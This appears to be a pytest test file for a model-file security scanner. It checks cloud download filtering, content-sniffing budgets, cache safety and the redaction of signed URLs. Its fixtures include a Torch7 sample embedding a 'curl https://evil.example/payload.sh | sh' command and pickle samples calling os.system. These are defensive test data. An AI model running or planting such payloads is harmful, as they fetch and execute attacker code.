        scannable_extensions=selected_scanner_extensions(policy, conservative=True),
        scanner_selection=policy.to_config(),
    )

    assert actual == files
    fs.open.assert_not_called()


def test_filter_scannable_cloud_files_keeps_custom_extensions_suffix_only_without_selection() -> None:
    url = "s3://bucket/models/weights.payload"
    payload = make_safetensors_payload()
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "weights.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs, scannable_extensions={".safetensors"}) == []
    fs.open.assert_not_called()


@pytest.mark.parametrize(
    ("filename", "payload_factory", "expected_format"),
    [
        pytest.param(
            "torch7.jpg",
            lambda _tmp_path: (
                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
            ),
            "torch7",
            id="torch7",
        ),
        pytest.param("coreml.jpg", make_coreml_payload, "coreml", id="coreml"),
        pytest.param("program.jpg", lambda _tmp_path: make_executorch_payload(), "executorch", id="executorch"),
        pytest.param(
            "llamafile.jpg",
            lambda _tmp_path: b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n",
            "llamafile",
            id="llamafile",
        ),
        pytest.param("flax.jpg", lambda _tmp_path: make_flax_msgpack_payload(), "flax_msgpack", id="flax-msgpack"),
    ],
)
def test_filter_scannable_cloud_files_matches_local_skip_filter_routes(
    tmp_path: Path,
    filename: str,
    payload_factory: Callable[[Path], bytes],
    expected_format: str,
) -> None:
    url = f"s3://bucket/models/{filename}"
    payload = payload_factory(tmp_path)
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})

    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": expected_format}]


@pytest.mark.parametrize("reported_size", [0, 1])
def test_filter_scannable_cloud_files_ignores_underreported_size(reported_size: int) -> None:
    url = "s3://bucket/models/model.payload"
    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "model.payload", "size": reported_size, "human_size": f"{reported_size} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "tflite"}]


def test_filter_scannable_cloud_files_routes_within_tiny_sniff_budget() -> None:
    url = "s3://bucket/models/model.payload"
    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    files = [{"path": url, "name": "model.payload", "size": 1, "human_size": "1 B"}]

    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=8) == [
        {**files[0], "content_detected_format": "tflite"}
    ]
    assert transferred == [8]


def test_filter_scannable_cloud_files_skips_complete_benign_content_at_exact_sniff_budget() -> None:
    url = "s3://bucket/models/preview.payload"
    payload = b"\x89PNG\r\n\x1a\n"
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    files = [{"path": url, "name": "preview.payload", "size": len(payload), "human_size": "8 B"}]

    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=len(payload)) == []
    assert transferred == [len(payload)]


def test_filter_scannable_cloud_files_caps_json_probe_at_shared_sniff_budget() -> None:
    url = "s3://bucket/models/model.payload"
    payload = b"{" + b" " * (64 * 1024)
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    files = [{"path": url, "name": "model.payload", "size": 1, "human_size": "1 B"}]

    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=32) == [
        {**files[0], "content_detected_format": "mxnet_symbol_routing_inconclusive"}
    ]
    assert transferred == [32]


def test_filter_scannable_cloud_files_fails_closed_when_shared_sniff_budget_is_exhausted() -> None:
    first_url = "s3://bucket/models/preview.png"
    hidden_url = "s3://bucket/models/hidden.payload?X-Amz-Signature=secret"
    payloads = {
        first_url: b"\x89PNG\r\n\x1a\n",
        hidden_url: b" " * (64 * 1024),
    }
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda path, _mode="rb": _CountingBytesIO(payloads[path], transferred)
    files = [
        {"path": first_url, "name": "preview.png", "size": 8, "human_size": "8 B"},
        {"path": hidden_url, "name": "hidden.payload", "size": 1, "human_size": "1 B"},
    ]

    with pytest.raises(ValueError) as excinfo:
        _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=32)

    error = str(excinfo.value)
    assert "maximum content inspection budget" in error
    assert "hidden.payload" in error
    assert "secret" not in error
    assert transferred == [32]


def test_filter_scannable_cloud_files_caps_zip_classification_at_sniff_budget() -> None:
    url = "s3://bucket/models/archive.payload"
    payload = make_zip_payload({"word/document.xml": b"<document />"})
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    files = [{"path": url, "name": "archive.payload", "size": 1, "human_size": "1 B"}]

    with pytest.raises(ValueError, match="selective filtering incomplete"):
        _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=16)

    assert transferred == [16]


def test_filter_scannable_cloud_files_reuses_complete_budgeted_zip_prefix() -> None:
    url = "s3://bucket/models/archive.payload"
    payload = make_zip_payload({"model.pkl": b"cos\nsystem\n(S'echo pwned'\ntR."})
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    files = [{"path": url, "name": "archive.payload", "size": 1, "human_size": "1 B"}]

    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=len(payload)) == [
        {**files[0], "content_detected_format": "zip"}
    ]
    assert transferred == [len(payload)]


@pytest.mark.parametrize(
    ("model_entry", "expected_format"),
    [
        pytest.param({"model.pkl": b"cos\nsystem\n(S'echo pwned'\ntR."}, "zip", id="model-bearing"),
        pytest.param({}, None, id="benign"),
    ],
)
def test_filter_scannable_cloud_files_reuses_partial_prefix_at_exact_zip_budget(
    model_entry: dict[str, bytes],
    expected_format: str | None,
) -> None:
    url = "s3://bucket/models/archive.payload"
    payload = make_zip_payload(
        {
            **{f"docs/{index}.txt": b"benign text" for index in range(120)},
            **model_entry,
        }
    )
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    files = [{"path": url, "name": "archive.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    expected = [] if expected_format is None else [{**files[0], "content_detected_format": expected_format}]
    assert _filter_scannable_cloud_files(files, fs=fs, max_sniff_bytes=len(payload)) == expected
    assert transferred[0] <= len(payload)


def test_filter_scannable_cloud_files_handles_short_remote_reads() -> None:
    class ShortReadBytesIO(io.BytesIO):
        def read(self, size: int | None = -1) -> bytes:
            return super().read(2 if size is None or size < 0 else min(size, 2))

    url = "s3://bucket/models/model.payload"
    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": ShortReadBytesIO(payload)
    files = [{"path": url, "name": "model.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "tflite"}]


def test_filter_scannable_cloud_files_preserves_whitespace_prefixed_jax_json() -> None:
    url = "s3://bucket/models/checkpoint.payload"
    payload = (b" " * (9 * 1024)) + json.dumps({"framework": "jax", "orbax_version": "0.1.0"}).encode()
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "checkpoint.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "jax_checkpoint"}]


def test_filter_scannable_cloud_files_preserves_jax_json_after_routing_budget() -> None:
    url = "s3://bucket/models/checkpoint.payload"
    payload = (b" " * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 1)) + json.dumps({"framework": "jax"}).encode()
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "checkpoint.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "jax_checkpoint"}]


def test_filter_scannable_cloud_files_skips_complete_whitespace_content() -> None:
    url = "s3://bucket/models/blank.payload"
    payload = b" " * (9 * 1024)
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "blank.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == []


def test_filter_scannable_cloud_files_preserves_oversized_inconclusive_xml() -> None:
    url = "s3://bucket/models/model.payload"
    payload = (
        b"<?xml version='1.0'?><!DOCTYPE PMML ["
        + (b"x" * (_XML_MODEL_SIGNATURE_READ_BYTES + 64))
        + b"]><PMML version='4.4'></PMML>"
    )
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "model.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [
        {**files[0], "content_detected_format": "xml_model_inconclusive"}
    ]


def test_filter_scannable_cloud_files_skips_complete_xml_probe_without_model_root() -> None:
    url = "s3://bucket/models/notes.payload"
    payload = (
        b"<?xml version='1.0'?><!--"
        + (b"x" * (_XML_MODEL_SIGNATURE_READ_BYTES - len(b"<?xml version='1.0'?><!--") - len(b"-->")))
        + b"-->"
    )
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "notes.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert len(payload) == _XML_MODEL_SIGNATURE_READ_BYTES
    assert _filter_scannable_cloud_files(files, fs=fs) == []


def test_filter_scannable_cloud_files_uses_actual_llamafile_size(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("modelaudit.utils.sources.cloud_storage._CLOUD_CONTENT_SNIFF_BYTES", 16)
    monkeypatch.setattr("modelaudit.utils.file.detection.LLAMAFILE_ROUTE_SCAN_BYTES", 64)
    monkeypatch.setattr("modelaudit.utils.file.detection.LLAMAFILE_ROUTE_TAIL_SCAN_BYTES", 32)

    url = "s3://bucket/models/runtime.payload"
    payload = b"\x7fELF" + b"\x00" * 116 + b"llamafile"
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})
    files = [{"path": url, "name": "runtime.payload", "size": 65, "human_size": "65 B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == [{**files[0], "content_detected_format": "llamafile"}]


def test_filter_scannable_cloud_files_redacts_protocol_stripped_path_errors() -> None:
    url = "bucket/models/evil.payload?X-Amz-Signature=secret"
    fs = make_fs_mock()
    fs.open.side_effect = PermissionError(f"denied {url}")
    files = [{"path": url, "name": "evil.payload", "size": 8, "human_size": "8 B"}]

    with pytest.raises(ValueError) as excinfo:
        _filter_scannable_cloud_files(files, fs=fs)

    error = str(excinfo.value)
    assert "evil.payload" in error
    assert "X-Amz-Signature=<redacted>" in error
    assert "secret" not in error


def test_filter_scannable_cloud_files_skips_benign_zip_content() -> None:
    url = "s3://bucket/models/document.payload"
    payload = make_zip_payload({"[Content_Types].xml": b"<Types />", "word/document.xml": b"<document />"})
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})

    files = [{"path": url, "name": "document.payload", "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == []


@pytest.mark.parametrize(
    ("filename", "payload"),
    [
        pytest.param(
            "settings.payload",
            make_zip_payload(
                {"config.json": json.dumps({"name": "not-a-keras-model", "config": {"theme": "light"}}).encode()}
            ),
            id="generic-config-zip",
        ),
        pytest.param("framing-only.payload", struct.pack("<Q", 4) + b"\x00" * 8, id="malformed-safetensors"),
        pytest.param("cntk-notes.payload", b"\x0a\x07version\x0a\x03uid", id="cntk-near-match"),
        pytest.param(
            "lightgbm-notes.payload",
            (
                b"tree implementation notes\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
            ),
            id="lightgbm-near-match",
        ),
        pytest.param(
            "mxnet-notes.payload",
            json.dumps({"nodes": [{"op": "Custom"}], "arg_nodes": [], "heads": [[0, 0, 0]]}).encode(),
            id="mxnet-near-match",
        ),
        pytest.param(
            "xml-notes.payload",
            b"<?xml version='1.0'?><!--" + (b"x" * (9 * 1024)) + b"--><root />",
            id="late-generic-xml",
        ),
        pytest.param(
            "tool.jpg",
            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
            id="generic-executable",
        ),
        pytest.param("program.jpg", b"\x0c\x00\x00\x00ETXX" + b"\x04\x00\x04\x00\x04\x00\x00\x00", id="executorch"),
    ],
)
def test_filter_scannable_cloud_files_skips_benign_content_near_matches(
    filename: str,
    payload: bytes,
) -> None:
    url = f"s3://bucket/models/{filename}"
    fs = make_fs_mock()
    configure_remote_open_payloads(fs, {url: payload})

    files = [{"path": url, "name": filename, "size": len(payload), "human_size": f"{len(payload)} B"}]

    assert _filter_scannable_cloud_files(files, fs=fs) == []


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_download_from_cloud_selective_includes_content_routed_tflite(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
    tmp_path: Path,
) -> None:
    url = "s3://bucket/models/"
    tflite_url = "s3://bucket/models/evil.payload"
    tflite_payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
    fs = make_fs_mock()
    fs.info.return_value = {"type": "directory"}
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(tflite_payload)
    configure_remote_open_payloads(fs, {tflite_url: tflite_payload})
    mock_fs_class.return_value = fs
    mock_analyze.return_value = {
        "type": "directory",
        "file_count": 1,
        "total_size": len(tflite_payload),
        "human_size": "24 B",
        "estimated_time": "instant",
        "files": [
            {
                "path": tflite_url,
                "name": "evil.payload",
                "size": len(tflite_payload),
                "human_size": "24 B",
            }
        ],
    }

    result = download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)

    assert isinstance(result, Path)
    fs.open.assert_called_once_with(tflite_url, "rb")
    fs.get.assert_called_once()
    assert fs.get.call_args.args[0] == tflite_url


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_download_from_cloud_selective_skips_benign_unsupported_content(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
    tmp_path: Path,
) -> None:
    url = "s3://bucket/models/"
    preview_url = "s3://bucket/models/preview.png"
    preview_payload = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16
    fs = make_fs_mock()
    fs.info.return_value = {"type": "directory"}
    configure_remote_open_payloads(fs, {preview_url: preview_payload})
    mock_fs_class.return_value = fs
    mock_analyze.return_value = {
        "type": "directory",
        "file_count": 1,
        "total_size": len(preview_payload),
        "human_size": "24 B",
        "estimated_time": "instant",
        "files": [
            {
                "path": preview_url,
                "name": "preview.png",
                "size": len(preview_payload),
                "human_size": "24 B",
            }
        ],
    }

    with pytest.raises(ValueError, match="No scannable model files found"):
        download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)

    fs.open.assert_called_once_with(preview_url, "rb")
    fs.get.assert_not_called()


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_download_from_cloud_selective_fails_closed_when_skipped_content_cannot_be_inspected(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
    tmp_path: Path,
) -> None:
    url = "s3://bucket/models/"
    hidden_url = "s3://bucket/models/evil.payload?X-Amz-Signature=secret"
    fs = make_fs_mock()
    fs.info.return_value = {"type": "directory"}
    fs.open.side_effect = PermissionError(f"denied {hidden_url}")
    mock_fs_class.return_value = fs
    mock_analyze.return_value = {
        "type": "directory",
        "file_count": 1,
        "total_size": 8,
        "human_size": "8 B",
        "estimated_time": "instant",
        "files": [{"path": hidden_url, "name": "evil.payload", "size": 8, "human_size": "8 B"}],
    }

    with pytest.raises(ValueError) as excinfo:
        download_from_cloud(url, cache_dir=tmp_path, use_cache=False, show_progress=False)

    error = str(excinfo.value)
    assert "selective filtering incomplete" in error
    assert "evil.payload" in error
    assert "X-Amz-Signature" not in error
    assert "secret" not in error
    fs.get.assert_not_called()


@pytest.mark.parametrize("streaming", [False, True])
@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_selective_cloud_download_caps_content_sniffing_at_max_size(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
    tmp_path: Path,
    streaming: bool,
) -> None:
    url = "s3://bucket/models/"
    hidden_url = "s3://bucket/models/hidden.payload?X-Amz-Signature=secret"
    payload = b" " * (64 * 1024)
    transferred = [0]
    fs = make_fs_mock()
    fs.open.side_effect = lambda _path, _mode="rb": _CountingBytesIO(payload, transferred)
    mock_fs_class.return_value = fs
    mock_analyze.return_value = {
        "type": "directory",
        "file_count": 1,
        "total_size": 1,
        "human_size": "1 B",
        "estimated_time": "instant",
        "files": [{"path": hidden_url, "name": "hidden.payload", "size": 1, "human_size": "1 B"}],
    }

    with pytest.raises(ValueError) as excinfo:
        if streaming:
            list(download_from_cloud_streaming(url, max_size=32, show_progress=False))
        else:
            download_from_cloud(
                url,
                cache_dir=tmp_path,
                max_size=32,
                use_cache=False,
                show_progress=False,
            )

    error = str(excinfo.value)
    assert "maximum content inspection budget" in error
    assert "hidden.payload" in error
    assert "secret" not in error
    assert transferred == [32]
    fs.get.assert_not_called()


@pytest.mark.parametrize("streaming", [False, True])
@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_selective_cloud_download_counts_content_probes_toward_total_budget(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
    tmp_path: Path,
    streaming: bool,
) -> None:
    url = "s3://bucket/models/"
    model_url = "s3://bucket/models/model.payload"
    payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": len(payload)}
    configure_remote_open_payloads(fs, {model_url: payload})
    mock_fs_class.return_value = fs
    mock_analyze.return_value = {
        "type": "directory",
        "file_count": 1,
        "total_size": len(payload),
        "human_size": f"{len(payload)} B",
        "estimated_time": "instant",
        "files": [
            {
                "path": model_url,
                "name": "model.payload",
                "size": len(payload),
                "human_size": f"{len(payload)} B",
            }
        ],
    }

    with pytest.raises(ValueError, match="exceeds maximum allowed size"):
        if streaming:
            list(download_from_cloud_streaming(url, max_size=(2 * len(payload)) - 1, show_progress=False))
        else:
            download_from_cloud(
                url,
                cache_dir=tmp_path,
                max_size=(2 * len(payload)) - 1,
                use_cache=False,
                show_progress=False,
            )

    fs.open.assert_called_once_with(model_url, "rb")
    fs.get.assert_not_called()


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_download_from_cloud_streaming_selective_includes_content_routed_tflite(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
) -> None:
    url = "s3://bucket/models/"
    tflite_url = "s3://bucket/models/evil.payload"
    tflite_payload = b"\x08\x00\x00\x00TFL3" + b"\x00" * 16
    fs = make_fs_mock()
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(tflite_payload)
    configure_remote_open_payloads(fs, {tflite_url: tflite_payload})
    mock_fs_class.return_value = fs
    mock_analyze.return_value = {
        "type": "directory",
        "file_count": 1,
        "total_size": len(tflite_payload),
        "human_size": "24 B",
        "estimated_time": "instant",
        "files": [
            {
                "path": tflite_url,
                "name": "evil.payload",
                "size": len(tflite_payload),
                "human_size": "24 B",
            }
        ],
    }

    streamed = list(download_from_cloud_streaming(url, show_progress=False))

    assert len(streamed) == 1
    assert streamed[0][1] is True
    fs.open.assert_called_once_with(tflite_url, "rb")
    fs.get.assert_called_once()
    assert fs.get.call_args.args[0] == tflite_url


@patch("fsspec.filesystem")
def test_download_from_cloud_fails_closed_on_partial_directory_metadata_error(
    mock_fs_class: MagicMock,
    tmp_path: Path,
) -> None:
    url = "s3://bucket/path/"
    fs = make_fs_mock()
    configure_partial_metadata_failure(fs, url)
    mock_fs_class.return_value = fs

    with pytest.raises(ValueError, match="Cloud directory analysis incomplete"):
        download_from_cloud(
            url,
            cache_dir=tmp_path,
            use_cache=False,
            selective=False,
            show_progress=False,
        )

    fs.get.assert_not_called()


@patch("fsspec.filesystem")
def test_download_from_cloud_streaming_fails_closed_on_partial_directory_metadata_error(
    mock_fs_class: MagicMock,
) -> None:
    url = "s3://bucket/path/"
    fs = make_fs_mock()
    configure_partial_metadata_failure(fs, url)
    mock_fs_class.return_value = fs

    with pytest.raises(ValueError, match="Cloud directory analysis incomplete"):
        list(download_from_cloud_streaming(url, selective=False, show_progress=False))

    fs.get.assert_not_called()


@patch("fsspec.filesystem")
def test_download_from_cloud(mock_fs: MagicMock, tmp_path: Path) -> None:
    fs_meta = make_fs_mock()
    fs_meta.info.return_value = {"type": "file", "size": 1024}

    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 1024}
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")

    mock_fs.side_effect = [fs_meta, fs]

    url = "s3://bucket/model.pt"
    result = download_from_cloud(url, cache_dir=tmp_path)

    # Verify fs.get was called (path will include cache subdirectories)
    fs.get.assert_called_once()
    call_args = fs.get.call_args[0]
    assert call_args[0] == url
    assert "model.pt" in call_args[1]

    # Result should be a path containing the filename
    assert isinstance(result, Path)
    assert result.name == "model.pt"

    # Note: fsspec filesystems don't need explicit cleanup according to implementation


@patch("fsspec.filesystem")
def test_download_from_cloud_reuses_cache_with_matching_etag(mock_fs: MagicMock, tmp_path: Path) -> None:
    url = "s3://bucket/model.pt"

    first_meta = make_fs_mock()
    first_meta.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}

    downloader = make_fs_mock()
    downloader.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}
    downloader.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")

    second_meta = make_fs_mock()
    second_meta.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}

    mock_fs.side_effect = [first_meta, downloader, second_meta]

    first = download_from_cloud(url, cache_dir=tmp_path, show_progress=False)
    second = download_from_cloud(url, cache_dir=tmp_path, max_size=4, show_progress=False)

    assert isinstance(first, Path)
    assert second == first
    assert first.read_bytes() == b"data"
    downloader.get.assert_called_once()
    assert mock_fs.call_count == 3


@patch("modelaudit.utils.sources.cloud_storage.analyze_cloud_target", new_callable=AsyncMock)
@patch("fsspec.filesystem")
def test_download_from_cloud_isolates_selective_directory_cache_by_scanner_selection(
    mock_fs_class: MagicMock,
    mock_analyze: AsyncMock,
    tmp_path: Path,
) -> None:
    url = "s3://bucket/models/"
    payloads = {
        "s3://bucket/models/weights.safetensors": make_safetensors_payload(),
        "s3://bucket/models/model.pkl": b"\x80\x04N.",
    }
    files = [
        {
            "path": file_url,
            "name": Path(file_url).name,
            "size": len(payload),
            "human_size": f"{len(payload)} B",
        }
        for file_url, payload in payloads.items()
    ]
    mock_analyze.return_value = {
        "type": "directory",
        "etag": "directory-etag",
        "file_count": len(files),
        "total_size": sum(len(payload) for payload in payloads.values()),
        "human_size": "small",
        "estimated_time": "instant",
        "files": files,
    }
    fs = make_fs_mock()
    fs.info.return_value = {"type": "directory"}
    configure_remote_open_payloads(fs, payloads)
    fs.get.side_effect = lambda src, dst: Path(dst).write_bytes(payloads[src])
    mock_fs_class.return_value = fs

    safetensors_policy = resolve_scanner_selection_policy(scanners=["safetensors"])
    pickle_policy = resolve_scanner_selection_policy(scanners=["pickle"])
    cache_dir = tmp_path / "cache"

    safetensors_path = download_from_cloud(
        url,
        cache_dir=cache_dir,
        show_progress=False,
        scannable_extensions=selected_scanner_extensions(safetensors_policy, conservative=True),
        scannable_filenames=selected_scanner_filenames(safetensors_policy, conservative=True),
        scanner_selection=safetensors_policy.to_config(),
    )
    pickle_path = download_from_cloud(
        url,
        cache_dir=cache_dir,
        show_progress=False,
        scannable_extensions=selected_scanner_extensions(pickle_policy, conservative=True),
        scannable_filenames=selected_scanner_filenames(pickle_policy, conservative=True),
        scanner_selection=pickle_policy.to_config(),
    )
    cached_pickle_path = download_from_cloud(
        url,
        cache_dir=cache_dir,
        show_progress=False,
        scannable_extensions=selected_scanner_extensions(pickle_policy, conservative=True),
        scannable_filenames=selected_scanner_filenames(pickle_policy, conservative=True),
        scanner_selection=pickle_policy.to_config(),
    )

    assert isinstance(safetensors_path, Path)
    assert isinstance(pickle_path, Path)
    assert safetensors_path != pickle_path
    assert cached_pickle_path == pickle_path
    assert {path.name for path in safetensors_path.iterdir()} == {"weights.safetensors"}
    assert {path.name for path in pickle_path.iterdir()} == {"model.pkl"}
    assert [call.args[0] for call in fs.get.call_args_list] == list(payloads)


@patch("fsspec.filesystem")
def test_download_from_cloud_does_not_reuse_cached_file_over_max_size(mock_fs: MagicMock, tmp_path: Path) -> None:
    url = "s3://bucket/model.pt"

    first_meta = make_fs_mock()
    first_meta.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}

    first_downloader = make_fs_mock()
    first_downloader.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}
    first_downloader.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")

    second_meta = make_fs_mock()
    second_meta.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}

    second_downloader = make_fs_mock()
    second_downloader.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}
    second_downloader.open.return_value = BytesIO(b"data")

    mock_fs.side_effect = [first_meta, first_downloader, second_meta, second_downloader]

    first = download_from_cloud(url, cache_dir=tmp_path, show_progress=False)
    assert isinstance(first, Path)
    first.write_bytes(b"oversized")

    second = download_from_cloud(url, cache_dir=tmp_path, max_size=4, show_progress=False)

    assert second == first
    assert second.read_bytes() == b"data"
    second_downloader.open.assert_called_once_with(url, "rb")
    assert mock_fs.call_count == 4


@patch("fsspec.filesystem")
def test_download_from_cloud_replaces_symlinked_cached_file_with_max_size(mock_fs: MagicMock, tmp_path: Path) -> None:
    url = "s3://bucket/model.pt"

    first_meta = make_fs_mock()
    first_meta.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}

    first_downloader = make_fs_mock()
    first_downloader.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}
    first_downloader.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"data")

    second_meta = make_fs_mock()
    second_meta.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}

    second_downloader = make_fs_mock()
    second_downloader.info.return_value = {"type": "file", "size": 4, "ETag": "etag-v1"}
    second_downloader.open.return_value = BytesIO(b"safe")

    mock_fs.side_effect = [first_meta, first_downloader, second_meta, second_downloader]

    first = download_from_cloud(url, cache_dir=tmp_path, show_progress=False)
    assert isinstance(first, Path)
    decoy = first.parent / "decoy.bin"
    decoy.write_bytes(b"keep")
    first.unlink()
    first.symlink_to(decoy.name)

    second = download_from_cloud(url, cache_dir=tmp_path, max_size=4, show_progress=False)

    assert second == first
    assert not second.is_symlink()
    assert second.read_bytes() == b"safe"
    assert decoy.read_bytes() == b"keep"
    second_downloader.open.assert_called_once_with(url, "rb")
    assert mock_fs.call_count == 4


@patch("fsspec.filesystem")
def test_download_from_cloud_clears_stale_directory_cache(mock_fs: MagicMock, tmp_path: Path) -> None:
    url = "s3://bucket/models"
    cache = GCSCache(cache_dir=tmp_path / "cache")
    stale_dir = tmp_path / "stale"
    stale_dir.mkdir()
    (stale_dir / "old-model.bin").write_bytes(b"old")
    cache.cache_file(url, stale_dir, etag="etag-v1")

    fs_meta = make_fs_mock()
    fs_meta.info.return_value = {"type": "directory", "ETag": "etag-v2"}
    fs_meta.glob.return_value = ["s3://bucket/models/new-model.bin"]
    fs_meta.info.side_effect = [
        {"type": "directory", "ETag": "etag-v2"},
        {"type": "file", "size": 3, "ETag": "file-etag-v2"},
    ]

    fs = make_fs_mock()
    fs.info.return_value = {"type": "file", "size": 3}
    fs.get.side_effect = lambda _src, dst: Path(dst).write_bytes(b"new")

    mock_fs.side_effect = [fs_meta, fs]

    result = download_from_cloud(url, cache_dir=tmp_path / "cache", show_progress=False, selective=False)

    assert isinstance(result, Path)
    assert not (result / "old-model.bin").exists()
    assert (result / "new-model.bin").read_bytes() == b"new"


@patch("fsspec.filesystem")
def test_download_from_cloud_replaces_symlinked_directory_cache_without_touching_target(
    mock_fs: MagicMock, tmp_path: Path
) -> None:
    url = "s3://bucket/models"
    cache = GCSCache(cache_dir=tmp_path / "cache")
    stale_dir = tmp_path / "stale"
    stale_dir.mkdir()
    (stale_dir / "old-model.bin").write_bytes(b"old")
    cache.cache_file(url, stale_dir, etag="etag-v1")
    cached_path = cache.get_cached_path(url, etag="etag-v1")
    assert cached_path is not None

    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    outside_marker = outside_dir / "keep.txt"
    outside_marker.write_text("keep", encoding="utf-8")
    (cached_path / "old-model.bin").unlink()
    cached_path.rmdir()
